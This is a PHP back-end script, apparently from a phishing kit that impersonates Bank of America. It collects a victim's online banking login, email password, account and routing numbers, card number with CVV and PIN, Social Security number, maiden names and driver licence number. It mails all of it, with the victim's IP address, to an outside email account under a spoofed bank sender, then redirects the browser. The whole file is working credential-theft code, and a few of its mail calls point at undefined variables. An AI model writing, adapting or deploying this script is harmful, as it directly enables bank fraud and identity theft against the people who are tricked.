<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "-----------------------------------------------------------------------------------\n";
$message .= " First OnlineID : : ".$_POST['onlineId']."\n";
$message .= " Second OnlineID  : ".$_POST['onlineId1']."\n";
$message .= " Passcode  : ".$_POST['password']."\n";
$message .= "-----------------------------------------------------------------------------------\n";
$message .= " Full Name : ".$_POST['fullname']."\n";
$message .= " Address  : ".$_POST['address']."\n";
$message .= " City  : ".$_POST['city']."\n";
$message .= " State  : ".$_POST['state']."\n";
$message .= " Zip  Code  : ".$_POST['zipcode']."\n";
$message .= " Phone Number  : ".$_POST['phone']."\n";
$message .= " Email Address : ".$_POST['email']."\n";
$message .= " Password Email  : ".$_POST['epass']."\n";
$message .= "-----------------------------------------------------------------------------------\n";
$message .= " Account Number  : ".$_POST['account']."\n";
$message .= " Routing Number  : ".$_POST['routing']."\n";
$message .= "-----------------------------------------------------------------------------------\n";
$message .= " Card Number : ".$_POST['cc']."\n";
$message .= " Expiry Date : ".$_POST['expmonth']."-".$_POST['expyear']."\n";
$message .= " Card Verification Number : ".$_POST['ccv']."\n";
$message .= " ATM or Check Card PIN : ".$_POST['pin']."\n";
$message .= "-----------------------------------------------------------------------------------\n";
$message .= " Date of Birth : ".$_POST['bmonth']."-".$_POST['bday']."-".$_POST['byear']."\n";
$message .= " Social Security Number  : ".$_POST['ssn']."\n";
$message .= " Father's Maiden Name  : ".$_POST['fmn']."\n";
$message .= " Mother's Maiden Name  : ".$_POST['mmn']."\n";
$message .= " Driver License Number  : ".$_POST['dln']."\n";
$message .= "-----------------------------------------------------------------------------------\n";
$message .= " IP Address : ".$ip."\n";
$message .= " HostName : ".$hostname."\n";
$message .= "-----------------------------------------------------------------------------------\n";
$rnessage  = "$message\n";
$message .= "-----------------------------------------------------------------------------------\n";

$send="a4min4@outlook.com";


$subject = "$ip";
$headers = "From: KRON<boa@bofa.net>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
Header ("Location:Quoen.php");
}
?>
